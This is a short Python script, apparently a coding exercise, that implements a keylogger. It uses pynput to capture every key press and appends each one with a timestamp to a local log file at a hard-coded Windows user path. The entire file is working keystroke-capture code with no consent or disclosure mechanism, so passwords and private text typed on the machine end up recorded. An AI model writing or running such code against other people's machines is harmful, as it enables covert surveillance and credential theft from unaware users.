from datetime import datetime
from pynput.keyboard import Listener
log_file= r"C:\Users\rveer\OneDrive\Documents\prodigy\log.txt"
def key_press(key):
    try :
        with open(log_file, 'a') as file:
            file.write(f"{datetime.now()} -- {key.char} ,\n")
    except AttributeError :
        with open(log_file,'a') as file:
            file.write(f"{datetime.now()} -- {key} , \n")
with Listener(on_press=key_press) as listener:
    listener.join()